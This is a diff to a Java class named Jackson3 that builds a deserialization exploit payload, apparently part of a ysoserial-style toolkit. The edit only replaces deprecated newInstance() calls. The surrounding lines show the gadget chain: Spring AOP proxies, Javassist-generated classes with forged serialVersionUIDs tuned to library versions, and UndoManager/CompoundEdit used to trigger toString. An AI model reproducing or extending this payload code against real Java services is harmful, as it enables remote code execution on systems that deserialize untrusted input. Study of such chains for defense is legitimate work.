@@ -39,7 +39,7 @@ public class Jackson3 implements ObjectPayload<Object>  {
 
         Object ctFactory = ctDefaultAdvisorChainFactory.toClass(
                 new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
-        ).newInstance();
+        ).getDeclaredConstructor().newInstance();
         advisedSupport.setAdvisorChainFactory((AdvisorChainFactory) ctFactory);
 
         Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
@@ -69,7 +69,7 @@ public class Jackson3 implements ObjectPayload<Object>  {
     public static Object makeAopProxy(String singletonTargetSourceClassName, String advisedSupportClassName, String jdkDynamicAopProxy, Class superClass, Object targetObject) throws Exception {
         Object singletonTargetSource = ThirdLibsClassLoader.loadClass_(singletonTargetSourceClassName).getConstructor(Object.class).newInstance(targetObject);
         Class<?> advisedSupportClazz = ThirdLibsClassLoader.loadClass_(advisedSupportClassName);
-        Object advisedSupport = advisedSupportClazz.newInstance();
+        Object advisedSupport = advisedSupportClazz.getDeclaredConstructor().newInstance();
         advisedSupportClazz.getMethod("setTarget", Object.class).invoke(advisedSupport, singletonTargetSource);
         Constructor<?> constructor = ThirdLibsClassLoader.loadClass_(jdkDynamicAopProxy).getConstructor(advisedSupportClazz);
         constructor.setAccessible(true);
@@ -86,7 +86,7 @@ public class Jackson3 implements ObjectPayload<Object>  {
                 "private static final long serialVersionUID = -" + sUID1 + "L;");
         Object list = ctEventListenerList.toClass(
                 new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
-        ).newInstance();
+        ).getDeclaredConstructor().newInstance();
 
         //>=6.1.0 为-1045223116463488483
         //<=6.0.23为-2077529998244066750
@@ -96,7 +96,7 @@ public class Jackson3 implements ObjectPayload<Object>  {
                 "private static final long serialVersionUID = -" + sUID2 + "L;");
         Object undomanager = ctUndoManager.toClass(
                 new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
-        ).newInstance();
+        ).getDeclaredConstructor().newInstance();
 
         //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
         Vector vector = (Vector) getFieldValue(undomanager, "edits");
